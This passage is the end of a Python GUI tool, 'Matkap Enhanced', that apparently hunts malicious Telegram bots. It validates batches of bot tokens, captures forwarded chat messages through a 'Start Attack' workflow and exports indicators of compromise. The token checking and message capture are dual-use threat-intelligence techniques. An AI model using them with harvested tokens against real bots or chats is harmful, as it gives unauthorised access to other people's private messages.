        total_urls = []
        
        for msg in self.captured_messages:
            analysis = self.analyzer.analyze_message(msg)
            
            # Add to tree
            time_str = datetime.fromtimestamp(msg.get("date", 0)).strftime("%H:%M:%S")
            self.results_tree.insert("", "end", values=(
                analysis["message_id"],
                time_str,
                analysis["suspicious_score"],
                ", ".join(analysis["flags"][:2]),  # Show first 2 flags
                len(analysis["urls"])
            ))
            
            if analysis["suspicious_score"] > 5:
                total_suspicious += 1
            total_urls.extend(analysis["urls"])
            
        # Update statistics
        self.stats_labels["Total Messages"].config(text=str(len(self.captured_messages)))
        self.stats_labels["Suspicious"].config(text=str(total_suspicious))
        self.stats_labels["URLs Found"].config(text=str(len(set(total_urls))))
        
        avg_risk = sum(self.analyzer.analyze_message(m)["suspicious_score"] for m in self.captured_messages) / len(self.captured_messages)
        self.stats_labels["Average Risk"].config(text=f"{avg_risk:.1f}")
        
        self.log(f"✅ Analysis complete: {len(self.captured_messages)} messages analyzed", "success")
        
    def generate_report(self):
        """Generate analysis report"""
        if not self.captured_messages:
            messagebox.showinfo("Info", "No messages to report")
            return
            
        report = self.analyzer.generate_report(self.captured_messages)
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
        )
        
        if filename:
            with open(filename, 'w') as f:
                json.dump(report, f, indent=2)
            self.log(f"✅ Report saved to {filename}", "success")
            
    def export_iocs(self):
        """Export Indicators of Compromise"""
        if not self.captured_messages:
            messagebox.showinfo("Info", "No messages to export IOCs from")
            return
            
        iocs = {
            "timestamp": datetime.now().isoformat(),
            "bot_token_hash": hashlib.sha256(self.bot_token.encode()).hexdigest() if self.bot_token else None,
            "urls": [],
            "suspicious_patterns": []
        }
        
        for msg in self.captured_messages:
            analysis = self.analyzer.analyze_message(msg)
            iocs["urls"].extend(analysis["urls"])
            iocs["suspicious_patterns"].extend(analysis["flags"])
            
        iocs["urls"] = list(set(iocs["urls"]))
        iocs["suspicious_patterns"] = list(set(iocs["suspicious_patterns"]))
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
        )
        
        if filename:
            with open(filename, 'w') as f:
                json.dump(iocs, f, indent=2)
            self.log(f"✅ IOCs exported to {filename}", "success")
            
    def clear_captured(self):
        """Clear captured messages"""
        if messagebox.askyesno("Confirm", "Clear all captured messages?"):
            self.captured_messages.clear()
            for item in self.results_tree.get_children():
                self.results_tree.delete(item)
            for label in self.stats_labels.values():
                label.config(text="0")
            self.log("Captured messages cleared", "warning")
            
    # Batch processing
    def add_to_queue(self):
        """Add token to queue"""
        token = self.batch_token_entry.get().strip()
        if token:
            self.queue_listbox.insert("end", token)
            self.batch_token_entry.delete(0, "end")
            self.log(f"Token added to queue", "info")
            
    def import_tokens(self):
        """Import tokens from file"""
        filename = filedialog.askopenfilename(
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            with open(filename, 'r') as f:
                tokens = f.read().splitlines()
                for token in tokens:
                    if token.strip():
                        self.queue_listbox.insert("end", token.strip())
            self.log(f"Imported {len(tokens)} tokens", "success")
            
    def remove_from_queue(self):
        """Remove selected token from queue"""
        selection = self.queue_listbox.curselection()
        if selection:
            self.queue_listbox.delete(selection[0])
            
    def clear_queue(self):
        """Clear token queue"""
        if messagebox.askyesno("Confirm", "Clear entire queue?"):
            self.queue_listbox.delete(0, "end")
            self.log("Queue cleared", "warning")
            
    def process_queue(self):
        """Process all tokens in queue"""
        tokens = self.queue_listbox.get(0, "end")
        if not tokens:
            messagebox.showinfo("Info", "Queue is empty")
            return
            
        self.log(f"Processing {len(tokens)} tokens...", "info")
        threading.Thread(target=self._process_queue_thread, args=(tokens,), daemon=True).start()
        
    def _process_queue_thread(self, tokens):
        """Process queue in background"""
        total = len(tokens)
        for i, token in enumerate(tokens):
            self.root.after(0, lambda p=(i+1)*100/total: self.batch_progress.config(value=p))
            self.root.after(0, lambda s=f"Processing {i+1}/{total}": self.batch_status_label.config(text=s))
            
            # Process token (simplified for demo)
            try:
                url = f"{TELEGRAM_API_URL}{token}/getMe"
                response = self.session.get(url, timeout=5)
                data = response.json()
                if data.get("ok"):
                    self.root.after(0, lambda t=token: self.log(f"✅ Token valid: {t[:20]}...", "success"))
                else:
                    self.root.after(0, lambda t=token: self.log(f"❌ Token invalid: {t[:20]}...", "error"))
            except:
                self.root.after(0, lambda t=token: self.log(f"❌ Token error: {t[:20]}...", "error"))
                
        self.root.after(0, lambda: self.batch_progress.config(value=0))
        self.root.after(0, lambda: self.batch_status_label.config(text="Complete"))
        self.root.after(0, lambda: self.log(f"✅ Batch processing complete", "success"))
        
    # OSINT methods
    def fofa_hunt(self):
        """FOFA hunting"""
        self.log("🔍 FOFA hunting not implemented in demo", "warning")
        messagebox.showinfo("FOFA", "FOFA integration requires fofa_api.py module")
        
    def urlscan_hunt(self):
        """URLScan hunting"""
        self.log("🔍 URLScan hunting not implemented in demo", "warning")
        messagebox.showinfo("URLScan", "URLScan integration requires urlscan_api.py module")
        
    # Settings and utilities
    def save_api_settings(self):
        """Save API settings to .env"""
        try:
            with open(".env", "w") as f:
                f.write(f"TELEGRAM_API_ID={self.api_id_entry.get()}\n")
                f.write(f"TELEGRAM_API_HASH={self.api_hash_entry.get()}\n")
                f.write(f"TELEGRAM_PHONE={self.phone_entry.get()}\n")
            self.log("✅ API settings saved", "success")
            messagebox.showinfo("Success", "API settings saved to .env file")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save settings: {str(e)}")
            
    def load_settings(self):
        """Load saved settings"""
        # This would load from a config file
        pass
        
    def export_logs(self):
        """Export logs to file"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            content = self.log_text.get("1.0", "end")
            with open(filename, 'w') as f:
                f.write(content)
            self.log(f"✅ Logs exported to {filename}", "success")
            
    def export_report(self):
        """Export full report"""
        self.generate_report()
        
    def clear_logs(self):
        """Clear log window"""
        if messagebox.askyesno("Confirm", "Clear all logs?"):
            self.log_text.delete("1.0", "end")
            
    def clear_session(self):
        """Clear Telegram session"""
        if messagebox.askyesno("Confirm", "Clear Telegram session? You'll need to re-authenticate."):
            if os.path.exists("anon_session.session"):
                os.remove("anon_session.session")
                self.log("Session cleared", "warning")
                
    def show_about(self):
        """Show about dialog"""
        messagebox.showinfo("About", 
            "Matkap Enhanced v2.1\n\n"
            "Advanced Telegram Bot Hunter\n"
            "With profile management, batch processing,\n"
            "custom message ID start, and advanced analysis.\n\n"
            "Created with ❤️ for security research by SM8")
        
    def show_docs(self):
        """Show documentation"""
        messagebox.showinfo("Documentation",
            "Quick Guide:\n\n"
            "1. Enter bot token and click 'Start Attack'\n"
            "2. Enter target chat ID\n"
            "3. (Optional) Enable custom Message ID start\n"
            "4. Click 'Forward Messages' to capture\n"
            "5. Use Analysis tab to examine results\n"
            "6. Generate reports and export IOCs\n\n"
            "For batch processing, use the Batch tab.\n"
            "Custom Message ID lets you start from a specific point.")


# Main execution
if __name__ == "__main__":
    root = tk.Tk()
    app = MatkapEnhancedGUI(root)
    root.mainloop()
